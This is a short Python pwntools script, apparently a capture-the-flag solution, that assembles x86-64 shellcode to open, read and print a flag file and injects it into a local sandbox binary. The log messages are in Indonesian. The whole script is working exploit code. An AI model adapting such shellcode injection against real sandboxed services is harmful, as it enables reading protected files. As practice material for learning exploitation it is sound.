from pwn import *

TARGET = './blackglass_sandbox'
context.arch = 'amd64'
context.log_level = 'info'


shellcode = asm('''
    lea rdi, [rip+flag]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rbx, rax

    mov rdi, rbx
    lea rsi, [rip + buf]
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdi, 1
    lea rsi, [rip + buf]
    mov rdx, rax
    mov rax, 1
    syscall

    flag:
        .string "flag.example"
    buf:
        .space 0x100, 0
''')


log.info(len(shellcode))

try:

    p = process(TARGET)

    p.recvuntil(b"stage:\n")

    log.info("Mengirimkan raw shellcode...")
    p.send(shellcode)

    flag = p.recvall(timeout=3)
    print(flag)


except Exception as e:
    log.error(f"Gagal mengeksekusi shellcode: {e}")